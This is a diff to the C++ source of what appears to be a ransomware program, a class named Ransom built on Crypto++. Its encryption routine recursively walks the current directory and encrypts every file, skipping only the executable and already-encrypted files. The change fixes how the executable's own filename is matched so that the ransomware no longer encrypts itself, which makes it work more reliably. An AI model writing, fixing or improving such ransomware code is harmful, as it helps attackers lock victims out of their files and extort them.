@@ -1,5 +1,4 @@
 #include "Ransom.h"
-
 #include "../cryptopp/files.h"
 
 inline bool EndOfFile(const CryptoPP::FileSource& file)
@@ -13,6 +12,7 @@ void Ransom::run_encryption_logic(const char* exe_file_name)
 	// 1- Get an encryption key
 	// 2- Get all files
 	// 3- Encrypt files
+	const auto file_name = std::filesystem::path(exe_file_name).filename();
 
 	safe_to_run();
 
@@ -21,7 +21,7 @@ void Ransom::run_encryption_logic(const char* exe_file_name)
 
 	for (const auto& entry : std::filesystem::recursive_directory_iterator(path))
 	{
-		if (entry.path().filename() == exe_file_name || entry.path().filename().extension() == custom_extension_name)
+		if (entry.path().filename() == file_name || entry.path().filename().extension() == custom_extension_name)
 		{
 			// Do not encrypt the key file, the executable itself, or an already encrypted file
 			continue;
@@ -45,10 +45,11 @@ void Ransom::run_decryption_logic(const char* exe_file_name)
 {
 	// if isEncrypted, find all files with the proper custom extension
 	const auto path = std::filesystem::current_path();
+	const auto file_name = std::filesystem::path(exe_file_name).filename();
 
 	for (const auto& entry : std::filesystem::recursive_directory_iterator(path))
 	{
-		if (entry.path().filename() == exe_file_name)
+		if (entry.path().filename() == file_name)
 		{
 			// Do not encrypt the key file, the executable itself, or an already encrypted file
 			continue;			
